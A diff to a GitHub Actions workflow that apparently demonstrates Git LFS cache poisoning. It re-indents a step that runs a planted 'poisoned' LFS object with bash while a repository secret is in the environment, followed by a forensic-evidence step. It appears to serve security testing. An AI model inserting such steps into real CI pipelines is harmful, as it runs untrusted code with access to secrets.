@@ -108,24 +108,22 @@ jobs:
           INJECTED_SHA=$(sha256sum "$OBJ_PATH" | cut -d' ' -f1)
           echo "Injected payload SHA256: ${INJECTED_SHA:0:16}..."
 
-- name: Execute Poisoned LFS Object
-  env:
-    AGGRESSIVE_SECRET: ${{ secrets.TEST_SECRET_AGGRESSIVE }}
-  run: |
-    set -eo pipefail
+  - name: Execute Poisoned LFS Object
+    env:
+      AGGRESSIVE_SECRET: ${{ secrets.TEST_SECRET_AGGRESSIVE }}
+    run: |
+      set -eo pipefail
 
-    # Execute the poisoned cache object directly (it IS our payload script)
-    OID="${{ steps.extract-oid.outputs.pointer_oid }}"
-    OBJ_PATH=".git/lfs/objects/${OID:0:2}/${OID:2:2}/$OID"
+      OID="${{ steps.extract-oid.outputs.pointer_oid }}"
+      OBJ_PATH=".git/lfs/objects/${OID:0:2}/${OID:2:2}/$OID"
 
-    if [ -f "$OBJ_PATH" ]; then
-      AGGRESSIVE_SECRET="${{ secrets.TEST_SECRET_AGGRESSIVE }}" bash "$OBJ_PATH"
-      echo "Executed poisoned cache object (exit code: $?)"
-    else
-      echo "ERROR: Cache object not found at $OBJ_PATH"
-      find .git/lfs/objects -type f 2>/dev/null | sort || true
-    fi
-          fi
+      if [ -f "$OBJ_PATH" ]; then
+        bash "$OBJ_PATH"
+        echo "Executed poisoned cache object successfully"
+      else
+        echo "ERROR: Cache object not found at $OBJ_PATH"
+        find .git/lfs/objects -type f 2>/dev/null | sort || true
+      fi
 
 - name: Collect Forensic Evidence
   if: always()
